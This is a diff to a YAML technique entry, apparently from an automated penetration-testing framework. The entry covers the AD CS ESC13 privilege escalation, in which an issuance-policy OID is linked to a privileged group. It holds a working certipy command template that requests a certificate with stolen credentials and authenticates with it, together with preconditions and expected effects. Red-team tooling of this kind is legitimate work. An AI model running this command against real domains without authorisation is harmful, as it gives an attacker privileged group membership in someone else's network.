@@ -1,7 +1,6 @@
 name: adcs_esc13
 category: ad
-description: ADCS ESC13 — OID group link in issuance policy grants implicit group
-  membership
+description: "ADCS ESC13 \u2014 OID group link in issuance policy grants implicit group membership"
 preconditions:
 - has_cred
 - service.port==445
@@ -13,8 +12,8 @@ parameters:
   password: from_cred.password
   ca: from_engagement.ca
   template: from_engagement.esc13_template
-command_template: certipy req -u {username}@{domain} -p '{password}' -ca '{ca}' -template
-  {template} -dc-ip {target_ip} && certipy auth -pfx {username}.pfx -domain {domain}
+command_template: certipy req -u {username}@{domain} -p '{password}' -ca '{ca}' -template {template} -dc-ip {target_ip} &&
+  certipy auth -pfx {username}.pfx -domain {domain}
 parser: generic_parser
 expected_effects:
 - certificate_obtained
@@ -34,4 +33,6 @@ mechanism: 'Issuance policy OID is linked (msDS-OIDToGroupLink) to a privileged 
 references:
   ocd_mindmap: 'Branch 7: ADCS ESC13 (OID group link)'
   hacktricks: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+  ocd_mindmap_node_ids:
+  - c73e87dca6
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
